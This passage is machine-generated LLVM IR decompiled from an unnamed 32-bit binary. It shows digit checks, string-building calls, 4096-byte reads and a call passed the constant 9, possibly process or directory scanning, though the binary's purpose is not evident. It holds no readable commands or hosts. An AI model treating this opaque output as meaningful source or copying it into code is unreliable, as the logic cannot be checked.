dec_label_pc_804d871:                             ; preds = %dec_label_pc_804d859
  %v1_804d871 = add i32 %v0_804d866, 20
  %v2_804d871 = inttoptr i32 %v1_804d871 to i32*
  %v3_804d871 = load i32, i32* %v2_804d871, align 4
  %v1_804d875 = icmp eq i32 %v3_804d871, 0
  %v1_804d877 = icmp eq i1 %v1_804d875, false
  br i1 %v1_804d877, label %dec_label_pc_804db62, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d871
  %v1_804d87d = add i32 %v0_804d861, 11
  store i32 %v1_804d87d, i32* @edi, align 4
  %v2_804d880 = inttoptr i32 %v1_804d87d to i8*
  %v3_804d880 = load i8, i8* %v2_804d880, align 1
  %v4_804d880 = zext i8 %v3_804d880 to i32
  %v6_804d880 = and i32 %v0_804d861, -256
  %v7_804d880 = or i32 %v4_804d880, %v6_804d880
  %v1_804d883 = add i32 %v7_804d880, -48
  %v8_804d883 = trunc i32 %v1_804d883 to i8
  store i32 %v1_804d883, i32* %eax.global-to-local, align 4
  %v8_804d888 = icmp ugt i8 %v8_804d883, 9
  br i1 %v8_804d888, label %dec_label_pc_804d859, label %dec_label_pc_804d88a

dec_label_pc_804d88a:                             ; preds = %dec_label_pc_804d87d
  %v2_804d88a = add i32 %v0_804d866, 12
  %v3_804d88a = inttoptr i32 %v2_804d88a to i32*
  store i32 %v1_804d883, i32* %v3_804d88a, align 4
  %v0_804d88b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d88b = add i32 %v0_804d866, 8
  %v3_804d88b = inttoptr i32 %v2_804d88b to i32*
  store i32 %v0_804d88b, i32* %v3_804d88b, align 4
  %v1_804d88c = add i32 %v0_804d866, 4
  %v2_804d88c = inttoptr i32 %v1_804d88c to i32*
  store i32 0, i32* %v2_804d88c, align 4
  %v2_804d88e = inttoptr i32 %v0_804d866 to i32*
  store i32 6, i32* %v2_804d88e, align 4
  %v3_804d890 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804d890, i32* %eax.global-to-local, align 4
  %v0_804d895 = load i32, i32* @esp, align 4
  %v1_804d895 = inttoptr i32 %v0_804d895 to i32*
  %v3_804d895 = add i32 %v0_804d895, 4
  %v1_804d896 = inttoptr i32 %v3_804d895 to i32*
  store i32 %v3_804d890, i32* %v1_804d896, align 4
  %v1_804d898 = add i32 %v0_804d895, 4139
  store i32 %v1_804d898, i32* %eax.global-to-local, align 4
  store i32 %v1_804d898, i32* %v1_804d895, align 4
  %v3_804d8a0 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8a0, i32* %eax.global-to-local, align 4
  %v0_804d8a5 = load i32, i32* @esp, align 4
  %v1_804d8a5 = inttoptr i32 %v0_804d8a5 to i32*
  %v2_804d8a5 = load i32, i32* %v1_804d8a5, align 4
  store i32 %v2_804d8a5, i32* @ebx, align 4
  %v1_804d8a6 = add i32 %v0_804d8a5, 4139
  store i32 %v1_804d8a6, i32* %edx.global-to-local, align 4
  store i32 %v1_804d8a6, i32* %v1_804d8a5, align 4
  %v2_804d8ae = call i32 @function_8051c50(i8* null)
  store i32 %v2_804d8ae, i32* %eax.global-to-local, align 4
  %v0_804d8b3 = load i32, i32* @esp, align 4
  %v1_804d8b3 = inttoptr i32 %v0_804d8b3 to i32*
  %v2_804d8b3 = load i32, i32* %v1_804d8b3, align 4
  store i32 %v2_804d8b3, i32* %edx.global-to-local, align 4
  %v3_804d8b3 = add i32 %v0_804d8b3, 4
  %v1_804d8b4 = inttoptr i32 %v3_804d8b3 to i32*
  %v0_804d8b5 = load i32, i32* @edi, align 4
  store i32 %v0_804d8b5, i32* %v1_804d8b4, align 4
  %v1_804d8b6 = add i32 %v0_804d8b3, 4139
  store i32 %v1_804d8b6, i32* %edx.global-to-local, align 4
  %v2_804d8bd = add i32 %v1_804d8b6, %v2_804d8ae
  store i32 %v2_804d8bd, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8bd, i32* %v1_804d8b3, align 4
  %v3_804d8c1 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d8c1, i32* %eax.global-to-local, align 4
  %v0_804d8c6 = load i32, i32* @esp, align 4
  %v1_804d8c6 = inttoptr i32 %v0_804d8c6 to i32*
  %v2_804d8c6 = load i32, i32* %v1_804d8c6, align 4
  store i32 %v2_804d8c6, i32* @ebp, align 4
  %v3_804d8c6 = add i32 %v0_804d8c6, 4
  %v1_804d8c7 = inttoptr i32 %v3_804d8c6 to i32*
  %v2_804d8c7 = load i32, i32* %v1_804d8c7, align 4
  store i32 %v2_804d8c7, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d8c7, align 4
  store i32 7, i32* %v1_804d8c6, align 4
  %v3_804d8cc = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804d8cc, i32* %eax.global-to-local, align 4
  %v0_804d8d1 = load i32, i32* @esp, align 4
  %v1_804d8d1 = inttoptr i32 %v0_804d8d1 to i32*
  %v2_804d8d1 = load i32, i32* %v1_804d8d1, align 4
  store i32 %v2_804d8d1, i32* @esi, align 4
  store i32 %v3_804d8cc, i32* @ebx, align 4
  %v1_804d8d4 = add i32 %v0_804d8d1, 4139
  store i32 %v1_804d8d4, i32* %eax.global-to-local, align 4
  store i32 %v1_804d8d4, i32* %v1_804d8d1, align 4
  %v2_804d8dc = call i32 @function_8051c50(i8* null)
  store i32 %v2_804d8dc, i32* %eax.global-to-local, align 4
  %v0_804d8e1 = load i32, i32* @esp, align 4
  %v1_804d8e1 = inttoptr i32 %v0_804d8e1 to i32*
  %v2_804d8e1 = load i32, i32* %v1_804d8e1, align 4
  store i32 %v2_804d8e1, i32* %edx.global-to-local, align 4
  %v3_804d8e1 = add i32 %v0_804d8e1, 4
  %v1_804d8e2 = inttoptr i32 %v3_804d8e1 to i32*
  %v0_804d8e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8e3, i32* %v1_804d8e2, align 4
  %v1_804d8e4 = add i32 %v0_804d8e1, 4139
  store i32 %v1_804d8e4, i32* %edx.global-to-local, align 4
  %v2_804d8eb = add i32 %v1_804d8e4, %v2_804d8dc
  store i32 %v2_804d8eb, i32* %eax.global-to-local, align 4
  store i32 %v2_804d8eb, i32* %v1_804d8e1, align 4
  %v3_804d8ef = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d8f4 = load i32, i32* @esp, align 4
  %v1_804d8f7 = add i32 %v0_804d8f4, 8
  %v2_804d8f7 = inttoptr i32 %v1_804d8f7 to i32*
  store i32 4096, i32* %v2_804d8f7, align 4
  %v1_804d8fc = add i32 %v0_804d8f4, 43
  store i32 %v1_804d8fc, i32* %eax.global-to-local, align 4
  %v2_804d900 = add i32 %v0_804d8f4, 4
  %v3_804d900 = inttoptr i32 %v2_804d900 to i32*
  store i32 %v1_804d8fc, i32* %v3_804d900, align 4
  %v1_804d901 = add i32 %v0_804d8f4, 4139
  store i32 %v1_804d901, i32* %edx.global-to-local, align 4
  %v3_804d908 = inttoptr i32 %v0_804d8f4 to i32*
  store i32 %v1_804d901, i32* %v3_804d908, align 4
  %v4_804d909 = call i32 @function_80523c2(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804d90e = load i32, i32* @esp, align 4
  %v1_804d90e = add i32 %v0_804d90e, 16
  %v1_804d911 = add i32 %v4_804d909, 1
  %v8_804d911 = icmp eq i32 %v1_804d911, 0
  store i32 %v1_804d911, i32* %eax.global-to-local, align 4
  br i1 %v8_804d911, label %dec_label_pc_804d859, label %dec_label_pc_804d918

dec_label_pc_804d918:                             ; preds = %dec_label_pc_804d88a
  %v2_804d918 = add i32 %v0_804d90e, 12
  %v3_804d918 = inttoptr i32 %v2_804d918 to i32*
  store i32 %v1_804d911, i32* %v3_804d918, align 4
  %v0_804d919 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d919 = add i32 %v0_804d90e, 8
  %v3_804d919 = inttoptr i32 %v2_804d919 to i32*
  store i32 %v0_804d919, i32* %v3_804d919, align 4
  %v1_804d91a = add i32 %v0_804d90e, 4
  %v2_804d91a = inttoptr i32 %v1_804d91a to i32*
  store i32 0, i32* %v2_804d91a, align 4
  %v2_804d91c = inttoptr i32 %v0_804d90e to i32*
  store i32 6, i32* %v2_804d91c, align 4
  %v3_804d91e = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804d91e, i32* %eax.global-to-local, align 4
  %v0_804d923 = load i32, i32* @esp, align 4
  %v1_804d923 = inttoptr i32 %v0_804d923 to i32*
  %v3_804d923 = add i32 %v0_804d923, 4
  %v1_804d924 = inttoptr i32 %v3_804d923 to i32*
  store i32 %v3_804d91e, i32* %v1_804d924, align 4
  %v1_804d926 = add i32 %v0_804d923, 4139
  store i32 %v1_804d926, i32* %eax.global-to-local, align 4
  store i32 %v1_804d926, i32* %v1_804d923, align 4
  %v3_804d92e = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d92e, i32* %eax.global-to-local, align 4
  %v0_804d933 = load i32, i32* @esp, align 4
  %v1_804d933 = inttoptr i32 %v0_804d933 to i32*
  %v2_804d933 = load i32, i32* %v1_804d933, align 4
  store i32 %v2_804d933, i32* @ebx, align 4
  %v1_804d934 = add i32 %v0_804d933, 4139
  store i32 %v1_804d934, i32* %edx.global-to-local, align 4
  store i32 %v1_804d934, i32* %v1_804d933, align 4
  %v2_804d93c = call i32 @function_8051c50(i8* null)
  store i32 %v2_804d93c, i32* %eax.global-to-local, align 4
  %v0_804d941 = load i32, i32* @esp, align 4
  %v1_804d941 = inttoptr i32 %v0_804d941 to i32*
  %v2_804d941 = load i32, i32* %v1_804d941, align 4
  store i32 %v2_804d941, i32* %edx.global-to-local, align 4
  %v3_804d941 = add i32 %v0_804d941, 4
  %v1_804d942 = inttoptr i32 %v3_804d941 to i32*
  %v0_804d943 = load i32, i32* @edi, align 4
  store i32 %v0_804d943, i32* %v1_804d942, align 4
  %v1_804d944 = add i32 %v0_804d941, 4139
  store i32 %v1_804d944, i32* %edx.global-to-local, align 4
  %v2_804d94b = add i32 %v1_804d944, %v2_804d93c
  store i32 %v2_804d94b, i32* %eax.global-to-local, align 4
  store i32 %v2_804d94b, i32* %v1_804d941, align 4
  %v3_804d94f = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d94f, i32* %eax.global-to-local, align 4
  %v0_804d954 = load i32, i32* @esp, align 4
  %v1_804d954 = inttoptr i32 %v0_804d954 to i32*
  %v2_804d954 = load i32, i32* %v1_804d954, align 4
  store i32 %v2_804d954, i32* @ebp, align 4
  %v3_804d954 = add i32 %v0_804d954, 4
  %v1_804d955 = inttoptr i32 %v3_804d954 to i32*
  %v2_804d955 = load i32, i32* %v1_804d955, align 4
  store i32 %v2_804d955, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d955, align 4
  store i32 9, i32* %v1_804d954, align 4
  %v3_804d95a = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804d95a, i32* %eax.global-to-local, align 4
  %v0_804d95f = load i32, i32* @esp, align 4
  %v1_804d95f = inttoptr i32 %v0_804d95f to i32*
  %v2_804d95f = load i32, i32* %v1_804d95f, align 4
  store i32 %v2_804d95f, i32* @esi, align 4
  store i32 %v3_804d95a, i32* @ebx, align 4
  %v1_804d962 = add i32 %v0_804d95f, 4139
  store i32 %v1_804d962, i32* %eax.global-to-local, align 4
  store i32 %v1_804d962, i32* %v1_804d95f, align 4
  %v2_804d96a = call i32 @function_8051c50(i8* null)
  store i32 %v2_804d96a, i32* %eax.global-to-local, align 4
  %v0_804d96f = load i32, i32* @esp, align 4
  %v1_804d96f = inttoptr i32 %v0_804d96f to i32*
  %v2_804d96f = load i32, i32* %v1_804d96f, align 4
  store i32 %v2_804d96f, i32* %edx.global-to-local, align 4
  %v3_804d96f = add i32 %v0_804d96f, 4
  %v1_804d970 = inttoptr i32 %v3_804d96f to i32*
  %v0_804d971 = load i32, i32* @ebx, align 4
  store i32 %v0_804d971, i32* %v1_804d970, align 4
  %v1_804d972 = add i32 %v0_804d96f, 4139
  store i32 %v1_804d972, i32* %edx.global-to-local, align 4
  %v2_804d979 = add i32 %v1_804d972, %v2_804d96a
  store i32 %v2_804d979, i32* %eax.global-to-local, align 4
  store i32 %v2_804d979, i32* %v1_804d96f, align 4
  %v3_804d97d = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804d982 = load i32, i32* @esp, align 4
  %v1_804d982 = inttoptr i32 %v0_804d982 to i32*
  %v1_804d983 = add i32 %v0_804d982, 4139
  store i32 %v1_804d983, i32* %eax.global-to-local, align 4
  store i32 %v1_804d983, i32* %v1_804d982, align 4
  %v1_804d98b = call i32 @function_80525b4(i32 0)
  store i32 %v1_804d98b, i32* %eax.global-to-local, align 4
  %v0_804d990 = load i32, i32* @esp, align 4
  %v1_804d990 = add i32 %v0_804d990, 16
  store i32 %v1_804d98b, i32* @ebp, align 4
  %v1_804d995 = icmp eq i32 %v1_804d98b, 0
  br i1 %v1_804d995, label %dec_label_pc_804d859, label %dec_label_pc_804d99d.preheader

dec_label_pc_804d99d.preheader:                   ; preds = %dec_label_pc_804d918
  %v3_804d9a083 = inttoptr i32 %v0_804d990 to i32*
  store i32 %v1_804d98b, i32* %v3_804d9a083, align 4
  %v0_804d9a184 = call i32 @function_80526a5()
  store i32 %v0_804d9a184, i32* @eax, align 4
  %v0_804d9a685 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a184, i32* @esi, align 4
  %v1_804d9ab87 = icmp eq i32 %v0_804d9a184, 0
  br i1 %v1_804d9ab87, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804d9b3:                             ; preds = %dec_label_pc_804d99d.preheader, %dec_label_pc_804d99d.backedge
  %v0_804d9a688 = phi i32 [ %v0_804d9a6, %dec_label_pc_804d99d.backedge ], [ %v0_804d9a685, %dec_label_pc_804d99d.preheader ]
  %v1_804d9b3 = add i32 %v0_804d9a688, 20
  %v2_804d9b3 = inttoptr i32 %v1_804d9b3 to i32*
  %v3_804d9b3 = load i32, i32* %v2_804d9b3, align 4
  store i32 %v3_804d9b3, i32* @eax, align 4
  %v1_804d9b7 = icmp eq i32 %v3_804d9b3, 0
  %v1_804d9b9 = icmp eq i1 %v1_804d9b7, false
  br i1 %v1_804d9b9, label %dec_label_pc_804dbee, label %dec_label_pc_804d9bf

dec_label_pc_804d9bf:                             ; preds = %dec_label_pc_804d9b3
  %v2_804d9bf = add i32 %v0_804d9a688, 12
  %v3_804d9bf = inttoptr i32 %v2_804d9bf to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9bf, align 4
  %v2_804d9c0 = add i32 %v0_804d9a688, 8
  %v3_804d9c0 = inttoptr i32 %v2_804d9c0 to i32*
  store i32 %v3_804d9b3, i32* %v3_804d9c0, align 4
  %v1_804d9c1 = add i32 %v0_804d9a688, 4
  %v2_804d9c1 = inttoptr i32 %v1_804d9c1 to i32*
  store i32 4096, i32* %v2_804d9c1, align 4
  %v1_804d9c6 = add i32 %v0_804d9a688, 43
  store i32 %v1_804d9c6, i32* %edx.global-to-local, align 4
  %v3_804d9ca = inttoptr i32 %v0_804d9a688 to i32*
  store i32 %v1_804d9c6, i32* %v3_804d9ca, align 4
  %v2_804d9cb = call i32 @function_8051ce0(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804d9cb, i32* %eax.global-to-local, align 4
  %v0_804d9d0 = load i32, i32* @esp, align 4
  %v1_804d9d0 = inttoptr i32 %v0_804d9d0 to i32*
  %v2_804d9d0 = load i32, i32* %v1_804d9d0, align 4
  store i32 %v2_804d9d0, i32* @ebx, align 4
  %v3_804d9d0 = add i32 %v0_804d9d0, 4
  %v1_804d9d1 = inttoptr i32 %v3_804d9d0 to i32*
  %v2_804d9d1 = load i32, i32* %v1_804d9d1, align 4
  store i32 %v2_804d9d1, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d9d1, align 4
  store i32 6, i32* %v1_804d9d0, align 4
  %v3_804d9d6 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804d9d6, i32* %eax.global-to-local, align 4
  %v0_804d9db = load i32, i32* @esp, align 4
  %v1_804d9db = inttoptr i32 %v0_804d9db to i32*
  %v2_804d9db = load i32, i32* %v1_804d9db, align 4
  store i32 %v2_804d9db, i32* %edx.global-to-local, align 4
  %v3_804d9db = add i32 %v0_804d9db, 4
  %v1_804d9dc = inttoptr i32 %v3_804d9db to i32*
  store i32 %v3_804d9d6, i32* %v1_804d9dc, align 4
  %v1_804d9de = add i32 %v0_804d9db, 4139
  store i32 %v1_804d9de, i32* %eax.global-to-local, align 4
  store i32 %v1_804d9de, i32* %v1_804d9db, align 4
  %v3_804d9e6 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d9e6, i32* %eax.global-to-local, align 4
  %v0_804d9eb = load i32, i32* @esp, align 4
  %v1_804d9eb = inttoptr i32 %v0_804d9eb to i32*
  %v2_804d9eb = load i32, i32* %v1_804d9eb, align 4
  store i32 %v2_804d9eb, i32* %eax.global-to-local, align 4
  %v1_804d9ec = add i32 %v0_804d9eb, 4139
  store i32 %v1_804d9ec, i32* %edx.global-to-local, align 4
  store i32 %v1_804d9ec, i32* %v1_804d9eb, align 4
  %v2_804d9f4 = call i32 @function_8051c50(i8* null)
  store i32 %v2_804d9f4, i32* %eax.global-to-local, align 4
  %v0_804d9f9 = load i32, i32* @esp, align 4
  %v1_804d9f9 = inttoptr i32 %v0_804d9f9 to i32*
  %v3_804d9f9 = add i32 %v0_804d9f9, 4
  %v1_804d9fa = inttoptr i32 %v3_804d9f9 to i32*
  %v2_804d9fa = load i32, i32* %v1_804d9fa, align 4
  store i32 %v2_804d9fa, i32* @ebx, align 4
  %v0_804d9fb = load i32, i32* @edi, align 4
  store i32 %v0_804d9fb, i32* %v1_804d9fa, align 4
  %v1_804d9fc = add i32 %v0_804d9f9, 4139
  store i32 %v1_804d9fc, i32* %edx.global-to-local, align 4
  %v2_804da03 = add i32 %v1_804d9fc, %v2_804d9f4
  store i32 %v2_804da03, i32* %eax.global-to-local, align 4
  store i32 %v2_804da03, i32* %v1_804d9f9, align 4
  %v3_804da07 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da07, i32* %eax.global-to-local, align 4
  %v0_804da0c = load i32, i32* @esp, align 4
  %v1_804da0c = inttoptr i32 %v0_804da0c to i32*
  %v2_804da0c = load i32, i32* %v1_804da0c, align 4
  store i32 %v2_804da0c, i32* %eax.global-to-local, align 4
  %v3_804da0c = add i32 %v0_804da0c, 4
  %v1_804da0d = inttoptr i32 %v3_804da0c to i32*
  %v2_804da0d = load i32, i32* %v1_804da0d, align 4
  store i32 %v2_804da0d, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_804da0d, align 4
  store i32 9, i32* %v1_804da0c, align 4
  %v3_804da12 = call i32 @function_8051250(i32 0, i32* nonnull @0)
  store i32 %v3_804da12, i32* @ebx, align 4
  %v0_804da19 = load i32, i32* @esp, align 4
  %v1_804da19 = inttoptr i32 %v0_804da19 to i32*
  %v1_804da1a = add i32 %v0_804da19, 4139
  store i32 %v1_804da1a, i32* %eax.global-to-local, align 4
  store i32 %v1_804da1a, i32* %v1_804da19, align 4
  %v2_804da22 = call i32 @function_8051c50(i8* null)
  store i32 %v2_804da22, i32* %eax.global-to-local, align 4
  %v0_804da27 = load i32, i32* @esp, align 4
  %v1_804da27 = inttoptr i32 %v0_804da27 to i32*
  %v2_804da27 = load i32, i32* %v1_804da27, align 4
  store i32 %v2_804da27, i32* %edx.global-to-local, align 4
  %v3_804da27 = add i32 %v0_804da27, 4
  %v1_804da28 = inttoptr i32 %v3_804da27 to i32*
  %v0_804da29 = load i32, i32* @ebx, align 4
  store i32 %v0_804da29, i32* %v1_804da28, align 4
  %v1_804da2a = add i32 %v0_804da27, 4139
  store i32 %v1_804da2a, i32* %edx.global-to-local, align 4
  %v2_804da31 = add i32 %v1_804da2a, %v2_804da22
  store i32 %v2_804da31, i32* %eax.global-to-local, align 4
  store i32 %v2_804da31, i32* %v1_804da27, align 4
  %v3_804da35 = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da35, i32* %eax.global-to-local, align 4
  %v0_804da3a = load i32, i32* @esp, align 4
  %v1_804da3a = inttoptr i32 %v0_804da3a to i32*
  %v2_804da3a = load i32, i32* %v1_804da3a, align 4
  store i32 %v2_804da3a, i32* @ebx, align 4
  %v1_804da3b = add i32 %v0_804da3a, 4139
  store i32 %v1_804da3b, i32* %eax.global-to-local, align 4
  store i32 %v1_804da3b, i32* %v1_804da3a, align 4
  %v2_804da43 = call i32 @function_8051c50(i8* null)
  store i32 %v2_804da43, i32* %eax.global-to-local, align 4
  %v0_804da48 = load i32, i32* @esp, align 4
  %v1_804da48 = inttoptr i32 %v0_804da48 to i32*
  %v2_804da48 = load i32, i32* %v1_804da48, align 4
  store i32 %v2_804da48, i32* %edx.global-to-local, align 4
  %v3_804da48 = add i32 %v0_804da48, 4
  %v1_804da49 = inttoptr i32 %v3_804da48 to i32*
  store i32 ptrtoint (i32* @global_var_8054aed.6 to i32), i32* %v1_804da49, align 4
  %v1_804da4f = add i32 %v0_804da48, 4139
  store i32 %v1_804da4f, i32* %edx.global-to-local, align 4
  %v2_804da56 = add i32 %v1_804da4f, %v2_804da43
  store i32 %v2_804da56, i32* %eax.global-to-local, align 4
  store i32 %v2_804da56, i32* %v1_804da48, align 4
  %v3_804da5a = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804da5a, i32* %eax.global-to-local, align 4
  %v0_804da5f = load i32, i32* @esp, align 4
  %v1_804da5f = inttoptr i32 %v0_804da5f to i32*
  %v2_804da5f = load i32, i32* %v1_804da5f, align 4
  store i32 %v2_804da5f, i32* @ebx, align 4
  %v1_804da60 = add i32 %v0_804da5f, 4139
  store i32 %v1_804da60, i32* %eax.global-to-local, align 4
  store i32 %v1_804da60, i32* %v1_804da5f, align 4
  %v2_804da68 = call i32 @function_8051c50(i8* null)
  store i32 %v2_804da68, i32* %eax.global-to-local, align 4
  %v0_804da6d = load i32, i32* @esp, align 4
  %v1_804da6d = inttoptr i32 %v0_804da6d to i32*
  %v3_804da6d = add i32 %v0_804da6d, 4
  %v0_804da6e = load i32, i32* @esi, align 4
  %v1_804da6e = add i32 %v0_804da6e, 11
  store i32 %v1_804da6e, i32* %edx.global-to-local, align 4
  %v1_804da71 = inttoptr i32 %v3_804da6d to i32*
  store i32 %v1_804da6e, i32* %v1_804da71, align 4
  %v1_804da73 = add i32 %v0_804da6d, 4139
  store i32 %v1_804da73, i32* %edx.global-to-local, align 4
  %v2_804da7a = add i32 %v1_804da73, %v2_804da68
  store i32 %v2_804da7a, i32* %eax.global-to-local, align 4
  store i32 %v2_804da7a, i32* %v1_804da6d, align 4
  %v3_804da7e = call i32 @function_8051c70(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v0_804da83 = load i32, i32* @esp, align 4
  %v1_804da86 = add i32 %v0_804da83, 8
  %v2_804da86 = inttoptr i32 %v1_804da86 to i32*
  store i32 4096, i32* %v2_804da86, align 4
  %v1_804da8b = add i32 %v0_804da83, 43
  store i32 %v1_804da8b, i32* %eax.global-to-local, align 4
  %v2_804da8f = add i32 %v0_804da83, 4
  %v3_804da8f = inttoptr i32 %v2_804da8f to i32*
  store i32 %v1_804da8b, i32* %v3_804da8f, align 4
  %v1_804da90 = add i32 %v0_804da83, 4139
  store i32 %v1_804da90, i32* %edx.global-to-local, align 4
  %v3_804da97 = inttoptr i32 %v0_804da83 to i32*
  store i32 %v1_804da90, i32* %v3_804da97, align 4
  %v4_804da98 = call i32 @function_80523c2(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804da9d = load i32, i32* @esp, align 4
  %v1_804daa0 = add i32 %v4_804da98, 1
  %v8_804daa0 = icmp eq i32 %v1_804daa0, 0
  store i32 %v1_804daa0, i32* %eax.global-to-local, align 4
  br i1 %v8_804daa0, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804daa7

dec_label_pc_804daa7:                             ; preds = %dec_label_pc_804d9bf
  %v1_804daaa = add i32 %v0_804da9d, 43
  store i32 %v1_804daaa, i32* %eax.global-to-local, align 4
  %v3_804daae = inttoptr i32 %v0_804da9d to i32*
  store i32 %v1_804daaa, i32* %v3_804daae, align 4
  %v2_804daaf = call i32 @function_8051c50(i8* null)
  %v0_804dab4 = load i32, i32* @esp, align 4
  %v1_804dab7 = add i32 %v0_804dab4, 8764
  store i32 %v1_804dab7, i32* @edx, align 4
  %v2_804dabe = add i32 %v0_804dab4, 8
  %v3_804dabe = inttoptr i32 %v2_804dabe to i32*
  store i32 %v1_804dab7, i32* %v3_804dabe, align 4
  %v2_804dabf = add i32 %v0_804dab4, 4
  %v3_804dabf = inttoptr i32 %v2_804dabf to i32*
  store i32 %v2_804daaf, i32* %v3_804dabf, align 4
  %v1_804dac0 = add i32 %v0_804dab4, 43
  store i32 %v1_804dac0, i32* %eax.global-to-local, align 4
  %v3_804dac4 = inttoptr i32 %v0_804dab4 to i32*
  store i32 %v1_804dac0, i32* %v3_804dac4, align 4
  %v4_804dac5 = call i32 @function_8051f40(i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804daca = load i32, i32* @esp, align 4
  %v1_804dacd = add i32 %v4_804dac5, 1
  %v8_804dacd = icmp eq i32 %v1_804dacd, 0
  store i32 %v1_804dacd, i32* %eax.global-to-local, align 4
  br i1 %v8_804dacd, label %dec_label_pc_804d99d.backedge, label %dec_label_pc_804dad4

dec_label_pc_804dad4:                             ; preds = %dec_label_pc_804daa7
  %v0_804dad4 = load i32, i32* @ebx, align 4
  %v2_804dad4 = add i32 %v0_804daca, 12
  %v3_804dad4 = inttoptr i32 %v2_804dad4 to i32*
  store i32 %v0_804dad4, i32* %v3_804dad4, align 4
  %v0_804dad5 = load i32, i32* @ebx, align 4
  %v2_804dad5 = add i32 %v0_804daca, 8
  %v3_804dad5 = inttoptr i32 %v2_804dad5 to i32*
  store i32 %v0_804dad5, i32* %v3_804dad5, align 4
  %v1_804dad6 = add i32 %v0_804daca, 4
  %v2_804dad6 = inttoptr i32 %v1_804dad6 to i32*
  store i32 10, i32* %v2_804dad6, align 4
  %v0_804dad8 = load i32, i32* @edi, align 4
  %v3_804dad8 = inttoptr i32 %v0_804daca to i32*
  store i32 %v0_804dad8, i32* %v3_804dad8, align 4
  %v3_804dad9 = call i32 @function_8051d50(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804dad9, i32* %eax.global-to-local, align 4
  %v0_804dade = load i32, i32* @esp, align 4
  %v1_804dade = inttoptr i32 %v0_804dade to i32*
  %v2_804dade = load i32, i32* %v1_804dade, align 4
  store i32 %v2_804dade, i32* %edx.global-to-local, align 4
  %v3_804dade = add i32 %v0_804dade, 4
  %v1_804dadf = inttoptr i32 %v3_804dade to i32*
  store i32 9, i32* %v1_804dadf, align 4
  store i32 %v3_804dad9, i32* %v1_804dade, align 4
  %v4_804dae3 = call i32 @function_80522d0(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804dae3, i32* %eax.global-to-local, align 4
  %v0_804dae8 = load i32, i32* @esp, align 4
  %v1_804dae8 = add i32 %v0_804dae8, 20
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  store i32 1, i32* %v2_804dae8, align 4
  %v0_804daf0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d99d.backedge

dec_label_pc_804d99d.backedge:                    ; preds = %dec_label_pc_804dad4, %dec_label_pc_804d9bf, %dec_label_pc_804daa7
  %v0_804d99d42.in = phi i32 [ %v0_804daf0, %dec_label_pc_804dad4 ], [ %v0_804da9d, %dec_label_pc_804d9bf ], [ %v0_804daca, %dec_label_pc_804daa7 ]
  %v0_804d9a0.pre = load i32, i32* @ebp, align 4
  %v3_804d9a0 = inttoptr i32 %v0_804d99d42.in to i32*
  store i32 %v0_804d9a0.pre, i32* %v3_804d9a0, align 4
  %v0_804d9a1 = call i32 @function_80526a5()
  store i32 %v0_804d9a1, i32* @eax, align 4
  %v0_804d9a6 = load i32, i32* @esp, align 4
  store i32 %v0_804d9a1, i32* @esi, align 4
  %v1_804d9ab = icmp eq i32 %v0_804d9a1, 0
  br i1 %v1_804d9ab, label %dec_label_pc_804dbee, label %dec_label_pc_804d9b3

dec_label_pc_804daf8:                             ; preds = %dec_label_pc_804d79b
  %v1_804daf8 = add i32 %v0_804daf8, 1
  store i32 %v1_804daf8, i32* @esi, align 4
  %v9_804daf9 = icmp eq i32 %v0_804daf8, 0
  %v1_804dafc = icmp eq i1 %v9_804daf9, false
  br i1 %v1_804dafc, label %dec_label_pc_804d7a3, label %dec_label_pc_804db02

dec_label_pc_804db02:                             ; preds = %dec_label_pc_804daf8
  %v1_804db02 = add i32 %v0_804d7a5, 3
  %v2_804db02 = inttoptr i32 %v1_804db02 to i8*
  %v3_804db02 = load i8, i8* %v2_804db02, align 1
  %v12_804db02 = icmp eq i8 %v3_804db02, 65
  %.stack_var_-8769.1 = select i1 %v12_804db02, i8 1, i8 %stack_var_-8769.1.ph
  %v1_804db08 = add i32 %v0_804d7a5, 1
